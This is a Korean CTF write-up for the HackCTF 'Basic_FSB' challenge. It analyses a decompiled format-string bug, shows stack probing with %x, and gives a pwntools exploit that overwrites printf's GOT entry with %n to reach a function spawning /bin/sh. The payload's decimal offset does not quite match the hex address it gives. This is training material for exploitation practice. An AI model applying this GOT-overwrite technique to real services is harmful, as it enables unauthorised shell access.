---


---

<h1 id="hackctfbasic_fsb">HackCTF:Basic_FSB</h1>
<h2 id="해석">2019-08-03 해석</h2>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  vuln();
  return 0;
}
</code></pre>
<p>함수 <code>vuln()</code>을 추적한다.</p>
<pre><code>int vuln()
{
  char s; // [esp+0h] [ebp-808h]
  char format; // [esp+400h] [ebp-408h]

  printf("input : ");
  fgets(&amp;s, 1024, stdin);
  snprintf(&amp;format, 0x400u, &amp;s);
  return printf(&amp;format);
}
</code></pre>
<p>함수 <code>snprintf()</code> 를 사용한다. <code>snprintf()</code>는 <code>sprintf()</code>에 사이즈 인자가 들어간 것으로 <code>sprintf()</code> 는 <code>printf()</code> 와 달리 stout이 아닌 buff등에 문자열을 저장한다. 리턴은 문자열의 사이즈이다.</p>
<p>이 프로그램은 1024byte의 문자열을 입력 받고 그 문자열을 <code>snprintf()</code>로 문자 배열에 넣은 뒤 출력하는 프로그램이다.</p>
<h2 id="풀이-1">2019-08-05 풀이-1</h2>
<p>FSB(Format String Bug)는 <code>printf()</code>와 같은 함수에서 문자열이 포맷에 따라 맞춰질때 생기는 취약점이다.<br>
%n라는 인자를 이용한다. 이 인자는 스트링의 byte size를 특정 주소에 넣는 기능을 한다. %4$n 이런 식으로 연속해서 사용 할 수 있다.</p>
<p>위의 소스에서 <code>snprintf()</code> 에 들어갈 스트링을 우리가 직접 입력할 수 있게 되어있다.</p>
<pre><code>int flag()
{
  puts("EN)you have successfully modified the value :)");
  puts(aKr);
  return system("/bin/sh");
}
</code></pre>
<p>또한 IDA로 <code>flag()</code> 함수가 있다는것을 확인했다. FSB로 이것을 실행하는 것이 목표이다.<br>
FSB를 파고들 때는 어떻게 해야 스택과 접촉이 가능한지 알아보는것이 핵심이다. 따라서 임의로 %x를 집어넣어 보겠다.</p>
<pre><code> ⚡ root@kali  ~/Documents/HackCTF/03-Basic_FSB  ./basic_fsb   
input : AAAA %x
AAAA f7fd02b4
 ⚡ root@kali  ~/Documents/HackCTF/03-Basic_FSB  ./basic_fsb
input : AAAA %x %x
AAAA f7f092b4 41414141
 ⚡ root@kali  ~/Documents/HackCTF/03-Basic_FSB  ./basic_fsb
input : AAAA %x %x %x
AAAA f7f1d2b4 41414141 20782520
 ⚡ root@kali  ~/Documents/HackCTF/03-Basic_FSB  
</code></pre>
<h2 id="풀이-2">2019-08-08 풀이-2</h2>
<p>%x(16진수 호출) 을 두번 사용하니 입력한 "AAAA"가 노출되었다. 즉 두번째 %x가 취하는 값은 우리가 입력한 값이다. 이 위치를 이용하여 printf의 got주소를 입력 한 뒤 두번째 인자를 %n으로 바꾸어 전체 byte를 <code>flag()</code> 함수의 주소로 맞추어보자.</p>
<pre><code>pwndbg&gt; p flag
$1 = {&lt;text variable, no debug info&gt;} 0x80485b4 &lt;flag&gt;
</code></pre>
<p>함수 <code>flag()</code>의 주소는 0x80485b4(134514096‬)이다.<br>
즉 <em>‘printf_got’(4byte) + %!ANY! + !SOMETHING! + %n = 134514096byte</em> 이여야 하며 SOMETHING을 조절해야 한다.<br>
이 때 %!ANY!의 사이즈는 %10x 식의 방식으로 사이즈를 지명하면 편리하게 사용할 수 있다. 꼭 16진수 형이 아니여도 가능하다.</p>
<p><strong><a href="http://payload.py">payload.py</a></strong></p>
<pre><code>from pwn import *
p = remote('ctf.j0n9hyun.xyz',3002)
e = ELF('./basic_fsb')

printf_got = e.got['printf']

payload = ''
payload += p32(printf_got)
payload += "%134514096x%n"

print payload
p.recvuntil(": ")
p.sendline(payload)
p.interactive()
</code></pre>

